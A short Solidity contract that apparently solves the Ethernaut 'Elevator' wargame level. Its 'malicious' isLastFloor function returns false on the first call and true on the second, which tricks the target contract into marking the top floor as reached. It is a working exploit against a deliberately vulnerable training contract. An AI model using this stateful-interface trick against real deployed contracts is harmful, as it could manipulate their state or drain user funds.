pragma solidity ^0.6.0;

interface Elevator{
  function goTo(uint) external;
}

contract Building {
  Elevator victim;
  bool result;

  // Send in the address of your ethernaut instance
  constructor(address _victimAddr) public {
    result = true;
    victim = Elevator(_victimAddr);
  }

  // Malicious implementation
  function isLastFloor(uint _floor) public returns (bool) {
    // First call, will return false
    // false return will trigger:
    // if (!building.isLastFloor()) { code }
    if (result == true) {
      result = false;
    }

    // Second call, returns true and setting top to true
    else {
      result = true;
    }
    return result;
  }

  function attack(uint _floor) public {
    victim.goTo(_floor);
  }
}
